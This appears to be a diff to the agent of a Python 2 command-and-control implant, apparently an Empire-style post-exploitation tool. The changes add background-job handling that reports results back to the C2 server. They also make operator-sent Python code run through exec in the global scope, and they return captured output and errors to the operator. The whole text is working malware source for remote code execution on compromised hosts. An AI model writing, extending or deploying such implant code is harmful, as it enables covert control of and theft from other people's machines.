@@ -46,7 +46,7 @@ for headerRaw in headersRaw:
     try:
         headerKey = headerRaw.split(":")[0]
         headerValue = headerRaw.split(":")[1]
-        
+
         if headerKey.lower() == "cookie":
             headers['Cookie'] = "%s;%s" %(headers['Cookie'], headerValue)
         else:
@@ -194,6 +194,19 @@ def processTasking(data):
         print "processTasking exception:",e
         pass
 
+def processJobTasking(result):
+    # process job data packets
+    #  - returns to the C2
+    # execute/process the packets and get any response
+    try:
+        resultPackets = ""
+        if result:
+            resultPackets += result
+        # send packets
+        sendMessage(resultPackets)
+    except Exception as e:
+        print "processTasking exception:",e
+        pass
 
 def processPacket(taskingID, data):
 
@@ -275,16 +288,14 @@ def processPacket(taskingID, data):
 
     elif taskingID == 50:
         # return the currently running jobs
-        msg = ""
-        
+        msg = "" 
         if len(jobs) == 0:
             msg = "No active jobs"
         else:
             msg = "Active jobs:\n"
             for x in xrange(len(jobs)):
-                msg += "\t%s" %(x)
-        
-        return encodePacket(50, msg )
+                msg += "\t%s" %(x)     
+        return encodePacket(50, msg)
 
     elif taskingID == 51:
         # stop and remove a specified job if it's running
@@ -302,7 +313,7 @@ def processPacket(taskingID, data):
             buffer = StringIO()
             sys.stdout = buffer
             code_obj = compile(data, '<string>', 'exec')
-            exec code_obj in {}
+            exec code_obj in globals()
             sys.stdout = sys.__stdout__
             results = buffer.getvalue()
             return encodePacket(100, str(results))
@@ -320,13 +331,13 @@ def processPacket(taskingID, data):
             buffer = StringIO()
             sys.stdout = buffer
             code_obj = compile(data, '<string>', 'exec')
-            exec code_obj in {}
+            exec code_obj in globals()
             sys.stdout = sys.__stdout__
             return encodePacket(101, '{0: <15}'.format(prefix) + '{0: <5}'.format(extension) + str(buffer.getvalue()) )
-        except:
-            # Also return partial code that has been executed 
+        except Exception as e:
+            # Also return partial code that has been executed
             errorData = str(buffer.getvalue())
-            return encodePacket(0, "error executing specified Python data")
+            return encodePacket(0, "error executing specified Python data %s \nBuffer data recovered:\n%s" %(e, errorData))
 
     elif taskingID == 102:
         # on disk code execution for modules that require multiprocessing not supported by exec
@@ -360,12 +371,12 @@ def processPacket(taskingID, data):
     elif taskingID == 110:
         start_job(data)
         return encodePacket(110, "job %s started" %(len(jobs)-1))
-        
+
     elif taskingID == 111:
         # TASK_CMD_JOB_SAVE
         # TODO: implement job structure
         pass
-    
+
     else:
         return encodePacket(0, "invalid tasking ID: %s" %(taskingID))
 
@@ -404,14 +415,33 @@ def start_job(code):
     codeBlock = "def method():\n" + indent(code)
 
     # register the code block
-    exec(codeBlock)
+    code_obj = compile(codeBlock, '<string>', 'exec')
+    # code needs to be in the global listing
+    # not the locals() scope
+    exec code_obj in globals()
     
     # create/start/return the thread
-    codeThread = ThreadWithReturnValue(target=method, args=())
+    # call the job_func so sys data can be cpatured
+    codeThread = ThreadWithReturnValue(target=job_func, args=())
     codeThread.start()
     
     jobs.append(codeThread)
 
+def job_func():
+    try:
+        old_stdout = sys.stdout  
+        sys.stdout = mystdout = StringIO()
+        # now call the function required 
+        # and capture the output via sys
+        method()
+        sys.stdout = old_stdout
+        dataStats_2 = mystdout.getvalue()
+        result = encodePacket(110, str(dataStats_2))
+        processJobTasking(result)
+    except Exception as e:
+        p = "error executing specified Python job data: " + str(e)
+        result = encodePacket(0, p)
+        processJobTasking(result)
 
 # additional implementation methods
 def run_command(command):
